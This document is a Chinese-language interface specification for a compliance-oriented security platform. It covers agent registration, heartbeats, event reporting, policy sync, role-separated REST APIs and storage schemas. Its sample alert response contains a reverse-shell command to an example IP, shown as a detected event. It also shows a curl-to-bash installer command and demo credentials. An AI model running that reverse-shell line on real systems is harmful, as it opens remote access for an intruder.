# 等保 2.0 三级模块化安全矩阵统一通信与接口规范文档

---

## 1. 规范定位与通信架构总览

本规范用于统一约束**自研安全管理中心（Control Plane）**与**各独立安全组件（WAF、EDR、日志审计、数据库审计、微隔离、防篡改等）**及其**专用轻量 Agent** 之间的所有通信交互、接口契约和数据结构。

```
                                  【安全管理中心】(Control Plane)
                                                ▲
                                                │ 
        ┌───────────────────────────────────────┴───────────────────────────────────────┐
        │                                                                               │
   【北向 RESTful API】                                                           【南向 gRPC / mTLS 双向加密】
   (面向前端控制台、SSO、第三方系统)                                                  (面向各独立 Agent、专用探针与组件服务端)
        │                                                                               │
        ├─ 1. 身份鉴别与 2FA 认证接口                                                   ├─ 1. Agent 动态注册与证书交换契约
        ├─ 2. 三权分立角色与操作接口矩阵                                                 ├─ 2. Agent 统一心跳与状态上报契约
        ├─ 3. 资产纳管与一键选配脚本生成接口                                             ├─ 3. 统一安全事件/告警上报契约 (Protobuf)
        ├─ 4. 态势大屏与多维日志检索接口                                                 ├─ 4. 安全策略与规则配置下发契约
        └─ 5. 等保合规自检与报表导出接口                                                 └─ 5. 应急响应控制契约 (阻断/查杀)
```

---

## 2. 南向通信协议契约 (Agent 与管理中心)

南向通信基于 **gRPC over mTLS (双向 TLS 1.3 加密)**，使用 Protocol Buffers (proto3) 严格定义数据格式，确保超高传输吞吐和最低资源消耗。

### 2.1 Agent 注册与身份握手协议 (`RegistrationService`)

```protobuf
syntax = "proto3";
package alinksec.agent.v1;

service RegistrationService {
  // Agent 首次启动时凭借管理中心生成的预共享 InstallToken 发起注册
  rpc Register (RegisterRequest) returns (RegisterResponse);
}

message RegisterRequest {
  string install_token = 1;     // 管理中心签发的单次或集群安装令牌
  string hostname = 2;          // 主机名
  string primary_ip = 3;        // 主机主网卡 IP
  string os_type = 4;           // linux
  string os_arch = 5;           // amd64 / arm64
  string kernel_version = 6;    // 内核版本
  string agent_type = 7;        // 组件类型: "log" | "edr" | "cfw" | "dbaudit" | "tamper" | "waf"
  string agent_version = 8;     // Agent 自身构建版本号
}

message RegisterResponse {
  enum StatusCode {
    SUCCESS = 0;
    INVALID_TOKEN = 1;
    UNSUPPORTED_AGENT = 2;
    SERVER_ERROR = 3;
  }
  StatusCode code = 1;
  string message = 2;
  string agent_id = 3;          // 平台分配的唯一全局 Agent UUID
  bytes client_cert_pem = 4;    // 平台下发的 mTLS 客户端证书 (有效通信凭证)
  bytes client_key_pem = 5;     // 平台下发的 mTLS 客户端私钥
  bytes ca_cert_pem = 6;         // 平台 CA 根证书
  int64 heartbeat_interval = 7; // 心跳周期(秒)，默认 15
}
```

### 2.2 Agent 心跳与健康检查契约 (`HeartbeatService`)

各独立 Agent 每隔 15 秒上报一次自身指标，管理中心借此实现**“集中管控与节点运行状态实时监控”**（等保 8.1.5.4 条款）。

```protobuf
service HeartbeatService {
  rpc Ping (HeartbeatRequest) returns (HeartbeatResponse);
}

message HeartbeatRequest {
  string agent_id = 1;
  int64 timestamp = 2;
  
  // 资源开销指标 (合规证明：证明 Agent 绝不拖垮业务)
  double cpu_usage_pct = 3;     // CPU 占用百分比 (如 0.25%)
  uint64 memory_rss_bytes = 4;  // 内存物理常驻开销 (字节，如 15728640 = 15MB)
  
  // 运行状态
  string status = 5;            // "running" | "degraded" | "error"
  uint64 error_count = 6;       // 运行错误计数
  string status_message = 7;
}

message HeartbeatResponse {
  int64 server_time = 1;        // 管理中心统一样本时间戳 (用于全网 NTP 时钟对齐)
  bool need_policy_sync = 2;    // 是否有新安全策略待同步
  string latest_policy_ver = 3; // 最新策略版本号
}
```

### 2.3 统一安全事件上报契约 (`SecurityEventService`)

无论是哪个独立组件的 Agent（WAF、EDR、数据库审计、防火墙），只要触发了告警或事件，均必须格式化为该统一结构上报。

```protobuf
service SecurityEventService {
  // 单条实时上报
  rpc ReportEvent (SecurityEvent) returns (ReportAck);
  // 批量高效上报 (日志采集 agent 专用)
  rpc BatchReportEvents (BatchSecurityEvents) returns (ReportAck);
}

enum ComponentType {
  COMP_UNKNOWN = 0;
  COMP_WAF = 1;
  COMP_FIREWALL = 2;
  COMP_EDR = 3;
  COMP_LOG_AUDIT = 4;
  COMP_DB_AUDIT = 5;
  COMP_TAMPER = 6;
  COMP_SCANNER = 7;
}

enum EventSeverity {
  SEV_INFO = 0;      // 普通审计日志
  SEV_LOW = 1;       // 低风险 (如偶发扫描探针)
  SEV_MEDIUM = 2;    // 中风险 (如密码连续输错3次)
  SEV_HIGH = 3;      // 高风险 (如 SQL 注入拦截、暴力破解拦截)
  SEV_CRITICAL = 4;  // 紧急 (如 Webshell 执行、反弹 Shell 成功、未授权修改核心静态网页)
}

message SecurityEvent {
  string event_id = 1;             // 事件唯一 UUID
  int64 timestamp_ns = 2;          // 纳秒级产生时间戳
  string host_id = 3;              // 产生事件的机器唯一标识
  string host_ip = 4;              // 主机 IP
  ComponentType component = 5;     // 来源组件
  string sub_module = 6;           // 子功能 (如 "bruteforce", "sqli", "reverse_shell")
  EventSeverity severity = 7;      // 严重程度
  
  string title = 8;                // 告警标题 (例: "检测到 SSH 暴力破解攻击")
  string description = 9;          // 告警详情简述
  
  // 网络上下文字段
  string src_ip = 10;
  uint32 src_port = 11;
  string dst_ip = 12;
  uint32 dst_port = 13;
  string proto = 14;               // "tcp" | "udp" | "http" | "mysql"
  
  // 主机上下文字段 (EDR/审计专属)
  uint32 process_pid = 15;
  string process_name = 16;
  string process_cmdline = 17;
  string process_md5 = 18;
  string user_name = 19;
  
  // 原始载荷与溯源凭据 (JSON 格式扩展字段)
  string raw_payload = 20;         // 截获的攻击 Payload 或 SQL 原始语句
  
  // 处置动作
  string action_taken = 21;        // "blocked" | "alerted" | "killed" | "ignored"
}

message BatchSecurityEvents {
  string agent_id = 1;
  repeated SecurityEvent events = 2;
}

message ReportAck {
  bool success = 1;
  int32 processed_count = 2;
}
```

### 2.4 安全策略下发与同步契约 (`PolicySyncService`)

```protobuf
service PolicySyncService {
  // Agent 拉取最新配置与策略规则
  rpc PullPolicy (PolicyPullRequest) returns (PolicyPullResponse);
}

message PolicyPullRequest {
  string agent_id = 1;
  string current_policy_version = 2;
}

message PolicyPullResponse {
  string policy_version = 1;
  int64 update_timestamp = 2;
  
  // 根据 Agent 类型的多态策略 Payload (JSON 字符串)
  // 例 1 (WAF-agent): {"sqli_block": true, "white_ips": ["192.168.1.0/24"]}
  // 例 2 (EDR-agent): {"ssh_bruteforce_limit": 5, "auto_kill_reverse_shell": true}
  // 例 3 (CFW-agent): {"rules": [{"proto": "tcp", "dst_port": 3306, "allow_src": ["10.0.1.2"]}]}
  string policy_content_json = 3;
}
```

---

## 3. 北向 RESTful API 规范 (Web 控制台与统一管理)

北向 API 面向用户 Web 控制台，基于 HTTP/JSON 遵循 OpenAPI 3.0 标准。

### 3.1 身份鉴别与 2FA 认证接口（强制满足 8.1.5.1 / 8.1.5.2）

#### ① 管理员登录认证
* **Method**: `POST`
* **Path**: `/api/v1/auth/login`
* **Request**:
```json
{
  "username": "sec_admin",
  "password": "Password@2026!",
  "totp_code": "489201"
}
```
* **Response**:
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expires_in": 7200,
    "user": {
      "id": "u_9812",
      "username": "sec_admin",
      "role": "ROLE_SEC_ADMIN",
      "role_name": "安全管理员",
      "requires_2fa_bind": false
    }
  }
}
```

#### ② 绑定与初始化 TOTP 动态令牌
* **Method**: `POST`
* **Path**: `/api/v1/auth/2fa/generate`
* **Headers**: `Authorization: Bearer <Token>`
* **Response**:
```json
{
  "code": 0,
  "data": {
    "secret": "JBSWY3DPEHPK3PXP",
    "qr_code_url": "otpauth://totp/AlinkSec:sec_admin?secret=JBSWY3DPEHPK3PXP&issuer=AlinkSec"
  }
}
```

---

### 3.2 三权分立权限接口控制矩阵

系统通过 JWT Claims 与 RBAC 过滤器实现接口级的严格物理隔离（**测评专家重点核验项**）：

| 接口功能描述 | 接口路径 (`Method`) | 系统管理员 (`Ops`) | 安全管理员 (`Sec`) | 审计管理员 (`Audit`) |
| :--- | :--- | :---: | :---: | :---: |
| **服务器资产纳管与查看** | `GET /api/v1/assets` | ✅ 允许 | ❌ 隐藏 | ❌ 隐藏 |
| **生成选配安装脚本** | `POST /api/v1/assets/installer-script` | ✅ 允许 | ❌ 隐藏 | ❌ 隐藏 |
| **重启 / 启停指定 Agent** | `POST /api/v1/assets/{id}/agent/control` | ✅ 允许 | ❌ 隐藏 | ❌ 隐藏 |
| **配置 WAF 防护白名单** | `POST /api/v1/policies/waf/rules` | ❌ 403 拒绝 | ✅ 允许 | ❌ 403 拒绝 |
| **下发微隔离防火墙策略** | `POST /api/v1/policies/firewall/rules` | ❌ 403 拒绝 | ✅ 允许 | ❌ 403 拒绝 |
| **设置 EDR 告警阈值** | `PUT /api/v1/policies/edr/config` | ❌ 403 拒绝 | ✅ 允许 | ❌ 403 拒绝 |
| **查询系统与管理员操作审计** | `GET /api/v1/audit/logs` | ❌ 403 拒绝 | ❌ 403 拒绝 | ✅ **专职只读** |
| **验证 180 天日志完整性** | `POST /api/v1/audit/verify-integrity` | ❌ 403 拒绝 | ❌ 403 拒绝 | ✅ **专职只读** |
| **导出等保合规自检报告** | `GET /api/v1/compliance/report/export` | ❌ 403 拒绝 | ✅ 允许 | ✅ 允许 |

---

### 3.3 资产纳管与一键选配安装脚本生成接口

* **Method**: `POST`
* **Path**: `/api/v1/assets/installer-script`
* **Headers**: `Authorization: Bearer <Token>` (仅系统管理员角色允许访问)
* **Request**:
```json
{
  "target_cluster": "production-cluster-01",
  "enabled_components": [
    "log",      // 勾选独立日志审计
    "edr",      // 勾选独立主机 EDR
    "tamper"    // 勾选网页防篡改
  ],
  "expire_hours": 24
}
```
* **Response**:
```json
{
  "code": 0,
  "data": {
    "command": "curl -sSL https://soc.alinksec.internal:8443/api/v1/agent/install.sh | bash -s -- --token=INS_TK_8832a8f9c10 --enable=log,edr,tamper",
    "expire_at": "2026-10-24T18:00:00Z"
  }
}
```

---

### 3.4 态势感知与统一告警事件检索接口

* **Method**: `GET`
* **Path**: `/api/v1/events`
* **Query Parameters**:
  * `component`: `waf` | `edr` | `dbaudit` | `cfw` | `all`
  * `severity`: `high` | `critical`
  * `start_time`: `2026-04-01T00:00:00Z`
  * `end_time`: `2026-10-23T23:59:59Z`
  * `page`: `1`
  * `page_size`: `50`
* **Response**:
```json
{
  "code": 0,
  "data": {
    "total": 1,
    "list": [
      {
        "event_id": "evt-7c9b20e1",
        "timestamp": 1792742400000,
        "component": "edr",
        "severity": "CRITICAL",
        "title": "拦截到高危反弹 Shell 攻击",
        "host_ip": "10.0.1.58",
        "src_ip": "198.51.100.23",
        "process_name": "bash",
        "process_cmdline": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
        "action_taken": "killed",
        "handled_by": "auto_edr_policy"
      }
    ]
  }
}
```

---

## 4. 存储与总线架构规约 (ClickHouse & NATS)

### 4.1 NATS 消息总线 Topic 树状结构规约

NATS 用作所有组件接入管理中心的高性能轻量消息通道：

| Topic 模式 | 生产者 | 消费者 | 说明 |
| :--- | :--- | :--- | :--- |
| `alinksec.event.audit.>` | 各节点 `log-agent` | ClickHouse 写入器 (Consumer) | 所有的系统日志、登录认证日志 |
| `alinksec.event.threat.waf.>` | 云 WAF 节点 / `waf-agent` | 态势感知引擎、告警聚合模块 | 应用层 SQLi/XSS/Webshell 攻击日志 |
| `alinksec.event.threat.edr.>` | 主机 `edr-agent` | 态势感知引擎、联动阻断模块 | 主机提权、爆破、反弹 Shell 告警 |
| `alinksec.event.threat.dbaudit.>` | 数据库 `dbaudit-agent` | 核心数据审计看板 | 高危 DROP/全表 DELETE/敏感导出 |
| `alinksec.cmd.control.{host_id}` | 管理中心控制台 | 对应目标主机 Agent | 策略下发、紧急 IP 封禁、文件自愈 |

---

### 4.2 ClickHouse 核心日志与审计表结构规约 (等保 180 天存储底座)

```sql
-- 1. 全网统一综合审计日志表 (强制 180 天存储与 SHA256 防篡改)
CREATE TABLE IF NOT EXISTS alinksec_dw.system_audit_logs
(
    event_id UUID DEFAULT generateUUIDv4(),
    log_time DateTime64(3, 'Asia/Shanghai'),
    host_id LowCardinality(String),
    host_ip IPv4,
    source_component LowCardinality(String), -- 'system', 'auth', 'nginx', 'edr', 'waf'
    facility LowCardinality(String),
    severity LowCardinality(String),        -- 'INFO', 'WARN', 'ERROR', 'FATAL'
    message String,
    raw_log String,
    
    -- 满足等保防篡改校验字段
    block_hash String,                      -- 连续 SHA256 哈希
    is_verified UInt8 DEFAULT 1
)
ENGINE = MergeTree()
PARTITION BY toYYYYMM(log_time)
ORDER BY (source_component, severity, log_time, host_id)
TTL log_time + INTERVAL 180 DAY             -- 严格写入等保三级 180 天生命周期
SETTINGS index_granularity = 8192;

-- 2. 全网安全威胁事件表 (持久化告警态势)
CREATE TABLE IF NOT EXISTS alinksec_dw.security_threat_events
(
    event_id String,
    event_time DateTime64(3, 'Asia/Shanghai'),
    host_id String,
    host_ip IPv4,
    component LowCardinality(String),
    sub_module LowCardinality(String),
    severity LowCardinality(String),
    title String,
    src_ip IPv4,
    dst_ip IPv4,
    action_taken LowCardinality(String),
    payload String
)
ENGINE = ReplacingMergeTree()
PARTITION BY toYYYYMM(event_time)
ORDER BY (severity, event_time, host_ip);
```

---

## 5. 主机端目录结构与命名规约 (各 Agent 独立规范)

为了防止多组件在同一台服务器上产生文件冲突或相互干扰，统一规范主机端文件系统布局：

```
/opt/alinksec/                          # 统一主安装根目录
├── certs/                              # 统一 mTLS 客户端证书存储区
│   ├── ca.crt
│   ├── agent.crt
│   └── agent.key
├── bin/                                # 各选配独立 Agent 二进制程序
│   ├── alinksec-log-agent              # 日志审计采集进程 (Vector 封装)
│   ├── alinksec-edr-agent              # 主机安全防御进程 (Elkeid/HIDS)
│   ├── alinksec-cfw-agent              # 东西向微隔离进程 (nftables 控制器)
│   ├── alinksec-dbaudit-agent          # 数据库审计抓包进程 (eBPF 探针)
│   └── alinksec-tamper-agent           # 网页防篡改守护进程 (fanotify 探针)
└── etc/                                # 各组件独立配置文件
    ├── log-agent.yaml
    ├── edr-agent.yaml
    └── cfw-agent.yaml

/var/log/alinksec/                      # 统一运行时日志目录
├── log-agent.log
├── edr-agent.log
└── cfw-agent.log

/etc/systemd/system/                    # 独立的 systemd 单元服务 (实现故障与资源硬隔离)
├── alinksec-log.service                # MemoryMax=20M, CPUQuota=1%
├── alinksec-edr.service                # MemoryMax=35M, CPUQuota=3%
├── alinksec-cfw.service                # MemoryMax=15M, CPUQuota=1%
└── alinksec-tamper.service             # MemoryMax=15M, CPUQuota=1%
```

---

## 6. 接口协议版本管理与升级策略
1. **语义化版本控制**：所有 gRPC API 与 RESTful API 路径严格遵循 `/api/v1/` 规范。后续如有破坏性重大变动，采用新路径 `/api/v2/` 并行灰度迁移。
2. **后向兼容要求**：所有 Protobuf 结构字段严禁复用已废弃的 Tag 编号（使用 `reserved` 标记），新增字段均作为可选字段追加，确保低版本 Agent 能正常连接高版本安全管理中心。
